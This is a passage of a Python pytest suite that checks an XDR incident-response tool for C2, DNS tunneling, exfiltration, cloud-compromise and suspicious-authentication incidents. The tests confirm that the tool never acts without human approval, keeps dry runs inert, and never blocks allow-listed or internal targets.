"""Adversarial safety tests, Phase 4 round 1, lens: workflow safety.

Every test asserts the SAFE behaviour required by docs/architecture.md (sections 13 and 14, as built
in 14.12) for the five Phase 4 workflows (c2, dns-tunneling, exfiltration, cloud-compromise,
suspicious-authentication), so a failing test is a defect. The tests start from each workflow's own
scenario fixtures and mutate them the way an attacker or an unlucky configuration would: allow-list
the targets, mark them critical, sanction the tool, fail a source, fail an action, pre-contain a
target, put credential-looking text into vendor records, and so on.

Fake data only: documentation IPs, example domains, fake hashes, hosts like TH-LT-1047 and users like
jsmith@example.com. Nothing here talks to a network or a real vendor; the simulated lab adapters
record every call they receive. Attacker behaviour is described abstractly.
"""
from __future__ import annotations

import ast
import copy
import json
from collections.abc import Callable, Iterable, Mapping
from typing import Any

import pytest
import yaml

from tools.simulator.scenario import REPO_ROOT
from tools.simulator.workflow_scenario import WorkflowScenario, WorkflowScenarioRun
from xdr_response import guard
from xdr_response.errors import ApprovalError
from xdr_response.models import (
    ActionType,
    ApprovalLevel,
    AuditEventType,
    ContainmentOverall,
    TargetKind,
    get_action_spec,
)
from xdr_response.workflows.discovery import discover_workflows

FIXTURES = REPO_ROOT / "tests" / "fixtures" / "workflows"
PACKAGE_DIR = REPO_ROOT / "src" / "xdr_response" / "workflows"
CATALOG = discover_workflows()
P4_WORKFLOWS = ("c2", "dns-tunneling", "exfiltration", "cloud-compromise", "suspicious-authentication")
#: Workflows whose baseline proposes endpoint actions (isolation, termination).
ENDPOINT_WORKFLOWS = ("c2", "dns-tunneling", "exfiltration")
#: Workflows whose baseline proposes a block_ip.
IP_WORKFLOWS = ("c2", "exfiltration", "cloud-compromise", "suspicious-authentication")
#: Workflows whose baseline proposes a block_domain.
DOMAIN_WORKFLOWS = ("c2", "dns-tunneling", "exfiltration")
#: Workflows whose baseline proposes account actions.
ACCOUNT_WORKFLOWS = ("exfiltration", "cloud-compromise", "suspicious-authentication")

_EXECUTION_EVENTS = frozenset({AuditEventType.ACTION_STARTED, AuditEventType.ACTION_RESULT,
                               AuditEventType.CONTROL_REGISTERED, AuditEventType.VERIFICATION_RESULT,
                               AuditEventType.CONTAINMENT_COMPLETED, AuditEventType.RESTORATION_RESULT})

SECRET_PASSWORD = "Hunter2LabSecret77"
SECRET_UNLOCK = "48151623"
SECRET_TOKEN = "lab-bearer-token-ZX9QW8ER7TY6"

_ENDPOINT_KINDS = (TargetKind.ENDPOINT, TargetKind.FILE, TargetKind.PROCESS, TargetKind.PERSISTENCE_ITEM)
_HOST = "TH-LT-1047"
_EXECUTIVE = "ceo@example.com"  # config/critical-assets.yaml executive_endpoint.match.users


# ------------------------------------------------------------------------------------- helpers --
def _raw(workflow: str, name: str) -> dict[str, Any]:
    with (FIXTURES / workflow / f"{name}.yaml").open(encoding="utf-8") as handle:
        return yaml.safe_load(handle)


def _scenario(data: Mapping[str, Any], workflow: str, name: str) -> WorkflowScenario:
    return WorkflowScenario.model_validate({**data, "path": FIXTURES / workflow / f"{name}.yaml"})


def _run(data: Mapping[str, Any], workflow: str, name: str, *, live: bool) -> WorkflowScenarioRun:
    return WorkflowScenarioRun(_scenario(data, workflow, name), live=live, catalog=CATALOG)


def _detect(data: Mapping[str, Any], workflow: str, name: str, *, live: bool) -> WorkflowScenarioRun:
    run = _run(data, workflow, name, live=live)
    run.detect()
    return run


def _baseline(workflow: str, name: str = "tp-approve-all") -> list[tuple[ActionType, str, TargetKind]]:
    run = _detect(_raw(workflow, name), workflow, name, live=False)
    package = run.detection.package
    guard._reset_for_test_harness()
    assert package is not None, f"{workflow}/{name}: the unmodified scenario must propose a package"
    return [(a.action_type, a.target, a.target_kind) for a in package.actions]


def _approvers(package: Any) -> list[str]:
    return ["analyst", "lead"] if package.has_elevated else ["analyst"]


def _approve_all(run: WorkflowScenarioRun) -> Any:
    package = run.orchestrator.latest_package(run.incident_id)
    return run.decide({"decision": "APPROVE_ALL"}, approvers=_approvers(package))


def _state_calls(run: WorkflowScenarioRun) -> list[tuple[str, str, str | None]]:
    return [(c.integration, c.operation, c.target) for c in run.environment.state_changing_calls()]


def _events(run: WorkflowScenarioRun) -> list[AuditEventType]:
    return [r.event_type for r in run.runtime.audit.records(run.incident_id)]


def _host_part(target: str) -> str:
    return target.split("/", 1)[0]


def _deep_merge(base: Mapping[str, Any], override: Mapping[str, Any]) -> dict[str, Any]:
    merged = dict(base)
    for key, value in override.items():
        if isinstance(value, Mapping) and isinstance(merged.get(key), Mapping):
            merged[key] = _deep_merge(merged[key], value)
        else:
            merged[key] = value
    return merged


def _with_config(data: Mapping[str, Any], override: Mapping[str, Any]) -> dict[str, Any]:
    out = copy.deepcopy(dict(data))
    out["config"] = _deep_merge(out.get("config") or {}, override)
    return out


def _repo_allowlists() -> dict[str, Any]:
    with (REPO_ROOT / "config" / "allowlists.yaml").open(encoding="utf-8") as handle:
        return yaml.safe_load(handle) or {}


def _allowlist_override(targets: Iterable[tuple[ActionType, str, TargetKind]], *,
                        spell: Callable[[TargetKind, str], str] = lambda _k, v: v) -> dict[str, Any]:
    base = _repo_allowlists()
    never = {k: list(v or []) for k, v in (base.get("never_block") or {}).items()}
    slot = {TargetKind.DOMAIN: "domains", TargetKind.URL: "urls", TargetKind.IP: "ips", TargetKind.HASH: "hashes",
            TargetKind.USER: "users", TargetKind.ENDPOINT: "endpoints"}
    for _action, target, kind in targets:
        if kind in slot:
            never.setdefault(slot[kind], []).append(spell(kind, target))
        elif kind in (TargetKind.FILE, TargetKind.PROCESS, TargetKind.PERSISTENCE_ITEM):
            never.setdefault("endpoints", []).append(spell(TargetKind.ENDPOINT, _host_part(target)))
    return {"allowlists": {**base, "never_block": {k: sorted(set(v)) for k, v in never.items()}}}


_ALLOWLISTABLE = frozenset({TargetKind.DOMAIN, TargetKind.URL, TargetKind.IP, TargetKind.HASH, TargetKind.USER,
                            TargetKind.ENDPOINT, TargetKind.FILE, TargetKind.PROCESS})


def _walk_replace(node: Any, old: str, new: str) -> Any:
    if isinstance(node, str):
        return new if node == old else node
    if isinstance(node, list):
        return [_walk_replace(v, old, new) for v in node]
    if isinstance(node, dict):
        return {k: _walk_replace(v, old, new) for k, v in node.items()}
    return node


def _text_replace(node: Any, old: str, new: str) -> Any:
    if isinstance(node, str):
        return node.replace(old, new)
    if isinstance(node, list):
        return [_text_replace(v, old, new) for v in node]
    if isinstance(node, dict):
        return {k: _text_replace(v, old, new) for k, v in node.items()}
    return node


def _records(data: Mapping[str, Any]) -> list[dict[str, Any]]:
    return [r["record"] for r in (data.get("environment") or {}).get("records") or ()]


def _rename_host_in_records(data: dict[str, Any], old: str, new: str) -> None:
    for entry in data["environment"].get("records") or ():
        entry["record"] = _text_replace(entry["record"], old, new)


def _on_host(action: Any, host: str) -> bool:
    return (action.target_kind in _ENDPOINT_KINDS
            and _host_part(action.target).upper().split(".", 1)[0] == host.upper())


def _outputs_text(run: WorkflowScenarioRun, *, audit: bool = True) -> str:
    parts: list[str] = []
    detection = run.detection
    if detection is not None and detection.package is not None:
        parts.append(detection.package.model_dump_json())
    if detection is not None:
        parts.append(json.dumps(list(detection.notes), default=str))
    wf = run.workflow_run
    if wf is not None:
        parts.append(wf.summary().model_dump_json())
        parts.append(json.dumps(list(wf.notes)))
        parts.extend(o.model_dump_json() for o in wf.outcomes)
        parts.extend(c.model_dump_json() if hasattr(c, "model_dump_json") else json.dumps(str(c))
                     for c in wf.considered)
        parts.extend(h.model_dump_json() if hasattr(h, "model_dump_json") else json.dumps(str(h))
                     for h in (getattr(wf, "handoffs", ()) or ()))
    for draft in run.outbox.drafts:
        parts.append(draft.model_dump_json())
    decision = getattr(run, "decision", None)
    if decision is not None and getattr(decision, "report", None) is not None:
        parts.append(decision.report.model_dump_json())
    if audit:
        for record in run.runtime.audit.records(run.incident_id):
            parts.append(record.model_dump_json())
    return "\n".join(parts)


def _considered_subjects(run: WorkflowScenarioRun) -> set[str]:
    return {c.subject for c in run.workflow_run.considered}


def _proposed(run: WorkflowScenarioRun) -> list[str]:
    package = run.detection.package
    return [f"{a.action_type.value}:{a.target}" for a in (package.actions if package else ())]


# ============================================================ 1. no state change without approval --
@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
@pytest.mark.parametrize("decision", ["REJECT", "REQUEST_MORE_INVESTIGATION"])
def test_live_detection_and_non_approving_decision_never_change_state(workflow: str, decision: str):
    """Investigation and recommendation are automatic; nothing state-changing happens (session
    revocation included) until a human approves, and a rejection or a request for more investigation
    never executes anything."""
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    assert run.detection.package is not None
    assert _state_calls(run) == []
    assert not (_EXECUTION_EVENTS & set(_events(run)))
    package = run.orchestrator.latest_package(run.incident_id)
    run.decide({"decision": decision, "comment": "lab decision"}, approvers=_approvers(package))
    assert _state_calls(run) == [], f"{workflow}: {decision} executed state-changing calls"
    assert run.runtime.registry.list(incident_id=run.incident_id) == []
    assert not (_EXECUTION_EVENTS & set(_events(run)))


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_non_human_principals_cannot_approve_any_workflow_package(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    package = run.orchestrator.latest_package(run.incident_id)
    for alias in ("ai", "automation"):
        with pytest.raises(ApprovalError):
            run.orchestrator.submit_decision(run._request(package, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"),
                                             run.credentials(alias))
        with pytest.raises(ApprovalError):
            run.orchestrator.submit_decision(run._request(package, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"),
                                             run.credentials("analyst", alias))
    assert _state_calls(run) == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_workflow_packages_never_import_execution_or_approval_code(workflow: str):
    """Workflows only investigate and recommend: their code imports no execution, approval, guard,
    token, restoration, lifecycle, audit, secrets or adapter module, and never calls a state-changing
    operation by name."""
    forbidden = ("xdr_response.execution", "xdr_response.approval", "xdr_response.guard",
                 "xdr_response.restoration", "xdr_response.lifecycle", "xdr_response.audit",
                 "xdr_response.secrets", "xdr_response.integrations", "xdr_response.verification",
                 "xdr_response.dryrun", "xdr_response.atomics.containment", "xdr_response.atomics.context")
    state_ops = {a.value for a in ActionType if get_action_spec(a).state_changing}
    problems: list[str] = []
    files = sorted((PACKAGE_DIR / workflow.replace("-", "_")).glob("*.py"))
    assert files, f"{workflow}: package not found"
    for path in files:
        tree = ast.parse(path.read_text(encoding="utf-8"), feature_version=(3, 12))
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom):
                module = node.module or ""
                if node.level == 0 and module.startswith(forbidden):
                    problems.append(f"{path.name}: from {module} import ...")
                if any(alias.name == "guard" for alias in node.names):
                    problems.append(f"{path.name}: imports guard")
            elif isinstance(node, ast.Import):
                problems += [f"{path.name}: import {a.name}" for a in node.names if a.name.startswith(forbidden)]
            elif isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                if node.func.attr in state_ops or node.func.attr in {"execute", "contain", "issue", "sign"}:
                    problems.append(f"{path.name}:{node.lineno}: calls .{node.func.attr}()")
            elif isinstance(node, ast.Name) and node.id in {"__import__", "importlib", "getattr", "eval", "exec"}:
                problems.append(f"{path.name}:{node.lineno}: dynamic access via {node.id}")
    assert problems == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_hand_offs_and_considerations_never_start_anything(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    wf = run.workflow_run
    package = run.detection.package
    proposed = {f"{a.action_type.value}:{a.target}" for a in package.actions}
    considered = {c.subject for c in wf.considered if ":" in c.subject}
    assert not (considered & proposed), f"withheld actions also proposed: {sorted(considered & proposed)}"
    packages = [r for r in run.runtime.audit.records(run.incident_id)
                if r.event_type is AuditEventType.PACKAGE_PROPOSED]
    assert len(packages) == 1
    assert _state_calls(run) == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_rerunning_detection_after_containment_does_not_execute_without_new_approval(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    _approve_all(run)
    calls_before = len(run.environment.state_changing_calls())
    try:
        run.orchestrator.handle_detection(run.workflow_scenario.incident)
    except Exception:  # noqa: BLE001 - refusing a second detection is fine
        pass
    assert len(run.environment.state_changing_calls()) == calls_before


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_rejected_package_cannot_be_approved_afterwards(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    package = run.orchestrator.latest_package(run.incident_id)
    run.decide({"decision": "REJECT", "comment": "lab rejection"}, approvers=_approvers(package))
    with pytest.raises(Exception):  # noqa: B017 - any refusal is fine; executing is not
        run.orchestrator.submit_decision(run._request(package, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"),
                                         run.credentials(*_approvers(package)))
    assert _state_calls(run) == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
@pytest.mark.parametrize("which", ["first", "last"])
def test_approve_selected_executes_only_the_selected_actions(workflow: str, which: str):
    """Approving one action approves only that action: nothing else in the package (for example the
    session revocation of an account) executes."""
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    package = run.orchestrator.latest_package(run.incident_id)
    chosen = package.actions[0] if which == "first" else package.actions[-1]
    run.decide({"decision": "APPROVE_SELECTED", "select": [f"{chosen.action_type.value}:{chosen.target}"]},
               approvers=_approvers(package))
    touched = {(op, (tgt or "").lower()) for _i, op, tgt in _state_calls(run)}
    others = {(a.action_type.value, a.target.lower()) for a in package.actions} - {
        (chosen.action_type.value, chosen.target.lower())}
    assert not (touched & others), f"{workflow}: unselected actions executed: {sorted(touched & others)}"


# ============================================================================= 2. dry run is inert --
@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
@pytest.mark.parametrize("name", ["tp-approve-all", "dry-run", "critical-asset-elevated"])
def test_dry_run_approve_all_is_side_effect_free_end_to_end(workflow: str, name: str):
    data = copy.deepcopy(_raw(workflow, name))
    run = _detect(data, workflow, name, live=False)
    if run.detection.package is None or not run.detection.package.actions:
        pytest.skip(f"{workflow}/{name}: no package")
    assert run.detection.package.dry_run
    run.decide({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    assert _state_calls(run) == []
    assert run.runtime.registry.list() == []
    assert not ({AuditEventType.ACTION_RESULT, AuditEventType.CONTROL_REGISTERED,
                 AuditEventType.RESTORATION_RESULT} & set(_events(run)))
    assert run.decision.report is None or run.decision.report.dry_run


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_dry_run_only_ever_reads_from_vendors(workflow: str):
    run = _detect(_raw(workflow, "dry-run"), workflow, "dry-run", live=False)
    run.decide({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    try:
        run.propose_release()
        run.decide_release({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    except Exception:  # noqa: BLE001 - refusing a dry-run release is fine
        pass
    kinds = sorted({(c.kind.value, c.integration, c.operation) for c in run.environment.calls
                    if c.kind.value != "READ"})
    assert kinds == [], f"{workflow}: dry run reached vendors with non-read calls {kinds}"
    assert run.runtime.registry.list() == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_package_proposed_under_dry_run_never_executes_live_after_dry_run_is_switched_off(workflow: str):
    run = _run(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    guard.configure(dry_run=True)
    run.detect()
    assert run.detection.package.dry_run
    guard.configure(dry_run=False)
    try:
        decision = _approve_all(run)
        assert decision.report is None or decision.report.dry_run
    except ApprovalError:
        pass
    assert _state_calls(run) == []
    assert run.runtime.registry.list() == []


# ================================================================== 3. benign produces no containment --
def _benign_cases() -> list[Any]:
    out = []
    for workflow in P4_WORKFLOWS:
        for path in sorted((FIXTURES / workflow).glob("*.yaml")):
            tags = (yaml.safe_load(path.read_text(encoding="utf-8")) or {}).get("tags") or []
            if "benign" in tags:
                out.append(pytest.param(workflow, path.stem, id=f"{workflow}/{path.stem}"))
    return out


@pytest.mark.parametrize("workflow, name", _benign_cases())
@pytest.mark.parametrize("live", [False, True], ids=["dry_run", "live"])
def test_benign_scenario_produces_no_containment(workflow: str, name: str, live: bool):
    run = _detect(_raw(workflow, name), workflow, name, live=live)
    package = run.detection.package
    assert package is None or not package.actions, (
        f"{workflow}/{name}: benign incident proposed {_proposed(run)}")
    if package is not None and package.actions:
        _approve_all(run)
    assert _state_calls(run) == []
    assert run.runtime.registry.list() == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_without_any_record_or_rating_nothing_is_recommended(workflow: str):
    """No invented facts: the incident title, MITRE techniques, observables and trigger context alone
    never produce a recommendation."""
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["records"] = []
    data["environment"]["reputations"] = []
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    assert package is None or not package.actions, f"{workflow}: proposed without records {_proposed(run)}"
    assert _state_calls(run) == []


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_ratings_alone_without_records_never_isolate_terminate_or_touch_accounts(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["records"] = []
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    bad = [f"{a.action_type.value}:{a.target}" for a in (package.actions if package else ())
           if a.action_type in (ActionType.ISOLATE_ENDPOINT, ActionType.TERMINATE_PROCESS, ActionType.DISABLE_USER,
                                ActionType.REVOKE_SESSIONS, ActionType.REMOVE_PRIVILEGED_ROLE)]
    assert bad == [], f"{workflow}: host or account actions without any host or account record: {bad}"


def _flip_verdicts(data: Mapping[str, Any], to: str = "CLEAN") -> dict[str, Any]:
    text = json.dumps(data)
    for verdict in ("MALICIOUS", "SUSPICIOUS"):
        text = text.replace(f'"{verdict}"', f'"{to}"')
    return json.loads(text)


@pytest.mark.parametrize("workflow", ["c2", "dns-tunneling"])
@pytest.mark.parametrize("live", [False, True], ids=["dry_run", "live"])
def test_every_verdict_clean_produces_no_containment(workflow: str, live: bool):
    """The c2 and dns-tunneling true positives rest on vendor verdicts and behaviour; with every
    verdict and reputation turned CLEAN, nothing is contained (a clean-rated parent is never blocked,
    beacons alone never rate a destination)."""
    data = _flip_verdicts(copy.deepcopy(_raw(workflow, "tp-approve-all")))
    run = _detect(data, workflow, "tp-approve-all", live=live)
    assert _proposed(run) == [], f"{workflow}: all-CLEAN incident proposed {_proposed(run)}"
    assert _state_calls(run) == []


def test_exfiltration_legacy_context_flags_are_never_evidence():
    """14.12.4: the legacy ``transfer_ongoing`` and ``insider_risk`` context flags are never evidence;
    put into the trigger of the benign scenario they must not create any action."""
    data = copy.deepcopy(_raw("exfiltration", "benign-no-action"))
    trigger = dict(data["incident"].get("trigger") or {})
    trigger.update({"transfer_ongoing": True, "insider_risk": True, "context": {"transfer_ongoing": True,
                                                                               "insider_risk": True}})
    data["incident"]["trigger"] = trigger
    run = _detect(data, "exfiltration", "benign-no-action", live=True)
    assert _proposed(run) == []
    assert _state_calls(run) == []


# ========================================================== 4. allow-listed items are never blocked --
@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_allowlisted_targets_are_excluded_visibly_and_never_executed(workflow: str):
    baseline = _baseline(workflow)
    listed = [t for t in baseline if t[2] in _ALLOWLISTABLE]
    data = _with_config(_raw(workflow, "tp-approve-all"), _allowlist_override(listed))
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    proposed = {(a.action_type, a.target) for a in package.actions} if package else set()
    excluded = {(e.action_type, e.target) for e in package.excluded_targets} if package else set()
    leaked = sorted(f"{a.value}:{t}" for a, t, _k in listed if (a, t) in proposed)
    assert leaked == [], f"{workflow}: allow-listed targets still proposed: {leaked}"
    hidden = sorted(f"{a.value}:{t}" for a, t, _k in listed
                    if (a, t) not in excluded and not any((a, t) == (o.action_type, o.target) for o in
                                                          run.workflow_run.outcomes))
    assert hidden == [], f"{workflow}: allow-listed targets silently dropped (not shown as excluded): {hidden}"
    if package is not None and package.actions:
        _approve_all(run)
    touched = {(op, (tgt or "").lower()) for _i, op, tgt in _state_calls(run)}
    hit = sorted(f"{a.value}:{t}" for a, t, _k in listed if (a.value, t.lower()) in touched)
    assert hit == [], f"{workflow}: state-changing calls on allow-listed targets: {hit}"


def _odd_spelling(kind: TargetKind, value: str) -> str:
    if kind is TargetKind.DOMAIN:
        return value.upper() + "."
    if kind in (TargetKind.HASH, TargetKind.USER):
        return value.upper()
    if kind is TargetKind.ENDPOINT:
        return value.lower()
    return value


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_allowlist_matching_ignores_case_and_trailing_dot(workflow: str):
    baseline = _baseline(workflow)
    listed = [t for t in baseline if t[2] in _ALLOWLISTABLE - {TargetKind.URL}]
    data = _with_config(_raw(workflow, "tp-approve-all"), _allowlist_override(listed, spell=_odd_spelling))
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    proposed = {(a.action_type, a.target) for a in package.actions} if package else set()
    leaked = sorted(f"{a.value}:{t}" for a, t, _k in listed if (a, t) in proposed)
    assert leaked == []


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_allowlisted_endpoint_reported_by_its_fqdn_is_never_contained(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    _rename_host_in_records(data, _HOST, _HOST + ".corp.example.com")
    endpoints = list((_repo_allowlists().get("never_block") or {}).get("endpoints") or []) + [_HOST]
    data = _with_config(data, {"allowlists": {"never_block": {"endpoints": endpoints}}})
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    leaked = sorted(f"{a.action_type.value}:{a.target}" for a in (package.actions if package else ())
                    if _on_host(a, _HOST))
    assert leaked == [], f"{workflow}: allow-listed {_HOST} proposed under its FQDN: {leaked}"
    if package is not None and package.actions:
        _approve_all(run)
    touched = [c for c in _state_calls(run) if (c[2] or "").upper().startswith(_HOST)]
    assert touched == [], f"{workflow}: state-changing calls on allow-listed {_HOST}: {touched}"


@pytest.mark.parametrize("workflow", DOMAIN_WORKFLOWS)
def test_approved_rmm_and_dns_tool_domains_are_never_blocked(workflow: str):
    baseline = _baseline(workflow)
    domains = sorted({t for _a, t, k in baseline if k is TargetKind.DOMAIN})
    assert domains
    base = _repo_allowlists()
    override = {"allowlists": {**base,
                               "approved_rmm": [{"name": "Lab RMM", "hashes": [], "domains": domains[:1],
                                                 "signers": []}],
                               "approved_dns_tools": [{"name": "Lab DNS", "hashes": [], "domains": domains[1:] or
                                                       domains, "signers": []}]}}
    data = _with_config(_raw(workflow, "tp-approve-all"), override)
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    leaked = [a.target for a in (package.actions if package else ())
              if a.target_kind is TargetKind.DOMAIN and a.target in domains]
    assert leaked == [], f"{workflow}: sanctioned tool domain proposed for blocking: {leaked}"
    if package is not None and package.actions:
        _approve_all(run)
    assert not [c for c in _state_calls(run) if (c[2] or "").lower() in domains]


_NON_PUBLIC = ["10.20.30.40", "127.0.0.1", "169.254.10.10", "100.64.1.9", "172.16.5.4"]


@pytest.mark.parametrize("workflow", IP_WORKFLOWS)
@pytest.mark.parametrize("address", _NON_PUBLIC)
def test_non_public_address_is_never_a_standard_ip_block(workflow: str, address: str):
    """A private, loopback, link-local or carrier-grade-NAT (VPN pool) address is the organisation's
    own network: put in place of the attacker IP (vendor ratings kept), it never becomes a STANDARD
    block_ip."""
    baseline = _baseline(workflow)
    ips = [t for a, t, _k in baseline if a is ActionType.BLOCK_IP]
    assert ips, f"{workflow}: precondition, a block_ip in the baseline"
    data = _walk_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), ips[0], address)
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    weak = [a.target for a in (package.actions if package else ())
            if a.action_type is ActionType.BLOCK_IP and a.target == address
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"{workflow}: non-public address {address} proposed as a STANDARD block_ip"


@pytest.mark.parametrize("workflow", IP_WORKFLOWS)
def test_core_infrastructure_address_is_never_blocked(workflow: str):
    """192.0.2.53 (the internal resolver) is never_block.ips and 192.0.2.0/28 never_block.cidrs:
    put in place of the attacker IP, it is excluded visibly and never blocked."""
    baseline = _baseline(workflow)
    ip = [t for a, t, _k in baseline if a is ActionType.BLOCK_IP][0]
    for address in ("192.0.2.53", "192.0.2.9"):
        data = _walk_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), ip, address)
        run = _detect(data, workflow, "tp-approve-all", live=True)
        package = run.detection.package
        blocked = [a.target for a in (package.actions if package else ())
                   if a.action_type is ActionType.BLOCK_IP and a.target == address]
        assert blocked == [], f"{workflow}: allow-listed infrastructure address {address} proposed"
        if package is not None and package.actions:
            _approve_all(run)
        assert not [c for c in _state_calls(run) if c[1] == "block_ip" and (c[2] or "") == address]
        guard._reset_for_test_harness()


@pytest.mark.parametrize("workflow", IP_WORKFLOWS)
def test_ipv4_mapped_spelling_of_an_allowlisted_address_is_not_blocked(workflow: str):
    baseline = _baseline(workflow)
    ips = [t for a, t, _k in baseline if a is ActionType.BLOCK_IP]
    mapped = "::ffff:192.0.2.5"
    data = _walk_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), ips[0], mapped)
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    blocked = [a.target for a in (package.actions if package else ()) if a.action_type is ActionType.BLOCK_IP]
    assert all("192.0.2.5" not in t and not t.startswith("::ffff:") for t in blocked), blocked
    if package is not None and package.actions:
        _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_ip" and "192.0.2.5" in (c[2] or "")]


@pytest.mark.parametrize("workflow", DOMAIN_WORKFLOWS)
@pytest.mark.parametrize("internal", ["update.example.internal", "printer.local", "files.corp.example.com"])
def test_internal_domain_is_never_silently_blocked(workflow: str, internal: str):
    baseline = _baseline(workflow)
    domain = [t for a, t, _k in baseline if a is ActionType.BLOCK_DOMAIN][0]
    data = json.loads(json.dumps(_raw(workflow, "tp-approve-all")).replace(domain, internal))
    run = _detect(data, workflow, "tp-approve-all", live=False)
    package = run.detection.package
    weak = [a.target for a in (package.actions if package else ())
            if a.action_type in (ActionType.BLOCK_DOMAIN, ActionType.BLOCK_URL) and internal in a.target
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"{workflow}: internal domain {internal} proposed as a STANDARD block: {weak}"


@pytest.mark.parametrize("workflow", DOMAIN_WORKFLOWS)
def test_the_organisations_own_domain_is_never_blocked(workflow: str):
    """The destination is renamed to a subdomain of example.com (never_block.domains, own domain):
    the owned domain is never blocked, whatever a vendor says about it."""
    baseline = _baseline(workflow)
    domain = [t for a, t, _k in baseline if a is ActionType.BLOCK_DOMAIN][0]
    data = json.loads(json.dumps(_raw(workflow, "tp-approve-all")).replace(domain, "cdn.example.com"))
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    blocked = [a.target for a in (package.actions if package else ()) if a.action_type is ActionType.BLOCK_DOMAIN
               and (a.target == "example.com" or a.target.endswith(".example.com"))]
    assert blocked == [], f"{workflow}: own domain proposed for a block: {blocked}"
    if package is not None and package.actions:
        _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_domain" and "example.com" in (c[2] or "")]


# ---------------------------------------------------------- 4b. sanctioned DNS tools (dns-tunneling) --
def test_dns_tunneling_approved_tool_domain_under_a_deeper_parent_is_excluded():
    """The incident names the approved tool's probe zone (probe.dnstools.example.net), a subdomain of
    the approved domain dnstools.example.net: the block is excluded, never proposed."""
    data = _text_replace(copy.deepcopy(_raw("dns-tunneling", "edge-approved-dns-tool")),
                         "dnstools.example.net", "probe.dnstools.example.net")
    data["config"] = _deep_merge(data.get("config") or {}, {"allowlists": _repo_allowlists()})
    run = _detect(data, "dns-tunneling", "edge-approved-dns-tool", live=True)
    package = run.detection.package
    blocked = [a.target for a in package.actions if a.action_type is ActionType.BLOCK_DOMAIN
               and "dnstools.example.net" in a.target]
    assert blocked == [], f"approved DNS tool zone proposed for blocking: {blocked}"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if "dnstools.example.net" in (c[2] or "")]


def test_dns_tunneling_approved_tool_host_is_not_isolated_when_the_query_event_carries_no_hash():
    """edge-approved-dns-tool: the approved DNS diagnostics tool (approved hash 2222..., listed in
    allowlists.approved_dns_tools) is the only thing querying the tunnel-like vendor domain on
    TH-LT-2050; its termination and the host's isolation are withheld.

    Variant: the trajectory reports the tool's start event (pid 5120) with its SHA-256, but the DNS
    query row of the same pid (a Defender timeline row, some trajectory events) carries only the
    process name. The runner identifies the binary from the start event and withholds the termination
    (14.11.6, ``_process_candidates``). The isolation must follow the same evidence: isolating an IT
    host for running the sanctioned tool must not be proposed while its termination is withheld as
    sanctioned."""
    data = copy.deepcopy(_raw("dns-tunneling", "edge-approved-dns-tool"))
    approved = "2222222222222222222222222222222222222222222222222222222222222222"
    for record in _records(data):
        if record.get("kind") == "process_event" and record.get("endpoint") == "TH-LT-2050":
            record.pop("sha256", None)
    data["environment"]["records"].append({
        "integration": "secure_endpoint", "atomic": "investigate_endpoint", "subject": "TH-LT-2050",
        "record": {"kind": "process_event", "event_id": "evt-dns-2050-0", "endpoint": "TH-LT-2050",
                   "timestamp": "2026-01-15T10:05:00Z", "event_type": "process_start",
                   "process_name": "dnsdiag.exe", "pid": 5120, "sha256": approved}})
    run = _detect(data, "dns-tunneling", "edge-approved-dns-tool", live=False)
    proposed = _proposed(run)
    assert "terminate_process:TH-LT-2050/5120" not in proposed, "precondition: the termination is withheld"
